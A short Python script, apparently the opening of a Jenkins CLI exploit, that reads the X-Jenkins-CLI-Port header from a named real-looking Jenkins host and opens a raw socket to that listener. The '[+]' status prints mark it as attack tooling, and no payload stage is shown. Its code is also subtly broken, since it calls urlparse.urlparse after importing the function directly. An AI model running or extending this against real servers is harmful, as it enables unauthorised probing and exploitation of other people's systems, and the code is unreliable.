import requests
import socket
from urllib.parse import urlparse

jenkins_web_url = 'https://jenkins.bixin.com'
i_headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
}
response = requests.get(jenkins_web_url, headers=i_headers)
print(response.headers)
cli_port = int(response.headers['X-Jenkins-CLI-Port'])
print('[+] Found CLI listener port: "%s"' % cli_port)

sock_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = urlparse.urlparse(jenkins_web_url).netloc
try:
    host, port = host.split(':')
except:
    host = host
cli_listener = (socket.gethostbyname(host), cli_port)
print('[+] Connecting CLI listener %s:%s' % cli_listener)
sock_fd.connect(cli_listener)